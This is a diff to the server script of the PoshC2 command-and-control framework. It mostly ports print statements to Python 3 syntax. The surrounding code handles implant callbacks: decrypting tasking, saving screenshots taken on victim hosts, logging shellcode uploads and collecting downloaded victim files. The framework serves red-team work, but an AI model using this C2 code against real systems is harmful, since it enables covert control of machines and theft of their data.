@@ -11,6 +11,7 @@ from DB import *
 from Payloads import *
 from Config import *
 from Cert import * 
+from Help import *
 
 class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
@@ -156,7 +157,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
               s.end_headers()            
               s.wfile.write(responseVal)
             except Exception as e:
-              print "Decryption error: %s" % e
+              print ("Decryption error: %s" % e)
               s.send_response(404)
               s.send_header("Content-type", "text/html")
               s.end_headers()            
@@ -192,31 +193,31 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             Domain = i[11]
             if RandomURI in s.path and cookieVal:
               decCookie = decrypt(encKey, cookieVal)
-              print Colours.GREEN
-              print "Command returned against implant %s on host %s %s (%s)" % (implantID,Hostname,Domain,now.strftime("%m/%d/%Y %H:%M:%S"))
+              print (Colours.GREEN)
+              print ("Command returned against implant %s on host %s %s (%s)" % (implantID,Hostname,Domain,now.strftime("%m/%d/%Y %H:%M:%S")))
               #print decCookie,Colours.END
               rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:]) 
               outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
               outputParsed = outputParsed.rstrip()
 
               if "ModuleLoaded" in decCookie:
-                print "Module loaded sucessfully"
+                print ("Module loaded sucessfully")
                 insert_completedtask(RandomURI, decCookie, "Module loaded sucessfully", "")
               if "get-screenshot" in decCookie.lower() or "screencapture" in decCookie.lower():
                 try:
                   decoded = base64.b64decode(outputParsed) 
                   filename = i[3] + "-" + now.strftime("%m%d%Y%H%M%S_"+randomuri())
                   output_file = open('%s%s.png' % (DownloadsDirectory,filename), 'wb')
-                  print "Screenshot captured: %s%s.png" % (DownloadsDirectory,filename)
+                  print ("Screenshot captured: %s%s.png" % (DownloadsDirectory,filename))
                   insert_completedtask(RandomURI, decCookie, "Screenshot captured: %s%s.png" % (DownloadsDirectory,filename), "")
                   output_file.write(decoded)
                   output_file.close()
                 except Exception as e:
                   insert_completedtask(RandomURI, decCookie, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!", "")                  
-                  print "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
+                  print ("Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
               elif (decCookie.lower().startswith("$shellcode64")) or (decCookie.lower().startswith("$shellcode64")):
                 insert_completedtask(RandomURI, decCookie, "Upload shellcode complete", "")
-                print "Upload shellcode complete"
+                print ("Upload shellcode complete")
               elif "download-file" in decCookie.lower():
                 try:
                   rawoutput = decrypt_bytes_gzip(encKey, (post_data[1500:]))
@@ -227,19 +228,19 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                   filename = filename.rstrip('\x00')
                   chunkNumber = rawoutput[:5]
                   totalChunks = rawoutput[5:10]
-                  print "Download file part %s of %s : %s" % (chunkNumber,totalChunks,filename)
+                  print ("Download file part %s of %s : %s" % (chunkNumber,totalChunks,filename))
                   insert_completedtask(RandomURI, decCookie, "Download file part %s of %s : %s" % (chunkNumber,totalChunks,filename), "")
                   output_file = open('%s/downloads/%s' % (ROOTDIR,filename), 'a')
                   output_file.write(rawoutput[10:])
                   output_file.close()
                 except Exception as e:
                   insert_completedtask(RandomURI, decCookie, "Error downloading file %s " % e, "")                                    
-                  print "Error downloading file %s " % e
+                  print ("Error downloading file %s " % e)
                 
               else:
                 insert_completedtask(RandomURI, decCookie, outputParsed, "")
-                print Colours.GREEN
-                print outputParsed,Colours.END
+                print (Colours.GREEN)
+                print (outputParsed + Colours.END)
         except Exception as e:
           e = ""
         finally:
@@ -257,18 +258,18 @@ if __name__ == '__main__':
       else:
         os.system('clear')
     except Exception as e:
-      print "cls"
-    print chr(27) + "[2J"
-    print Colours.GREEN, logo
-    print Colours.END,""
+      print ("cls")
+    print (chr(27) + "[2J")
+    print (Colours.GREEN + logopic)
+    print (Colours.END + "")
 
 
     # KeyFile = None, CertFile = None, ClientCertCAs = None
     if os.path.isfile(DB):
-      print "Using existing database / project",Colours.GREEN
+      print ("Using existing database / project" + Colours.GREEN)
     else:
-      print "Initializing new project folder and database",Colours.GREEN
-      print ""
+      print ("Initializing new project folder and database" + Colours.GREEN)
+      print ("")
       directory = os.path.dirname(ROOTDIR)
       if not os.path.exists(directory):
         os.makedirs(directory)
@@ -298,13 +299,13 @@ if __name__ == '__main__':
       newPayload.CreatePython()
       newPayload.WriteQuickstart( directory + '/quickstart.txt' )
 
-    print ""
-    print "CONNECT URL: "+select_item("HostnameIP", "C2Server")+get_newimplanturl(),Colours.GREEN
-    print "WEBSERVER Log: %swebserver.log" % ROOTDIR
+    print ("")
+    print ("CONNECT URL: "+select_item("HostnameIP", "C2Server")+get_newimplanturl() + Colours.GREEN)
+    print ("WEBSERVER Log: %swebserver.log" % ROOTDIR)
     KEY = get_baseenckey()
-    print ""
-    print time.asctime(), "PoshC2 Server Started - %s:%s" % (HOST_NAME, PORT_NUMBER)
-    print Colours.END
+    print ("")
+    print (time.asctime() + "PoshC2 Server Started - %s:%s" % (HOST_NAME, PORT_NUMBER))
+    print (Colours.END)
 
     if (os.path.isfile("%sposh.crt" % ROOTDIR)) and (os.path.isfile("%sposh.key" % ROOTDIR)):
       httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True)
@@ -317,4 +318,4 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         pass
     httpd.server_close()
-    print time.asctime(), "PoshC2 Server Stopped - %s:%s" % (HOST_NAME, PORT_NUMBER)
+    print (time.asctime() + "PoshC2 Server Stopped - %s:%s" % (HOST_NAME, PORT_NUMBER))
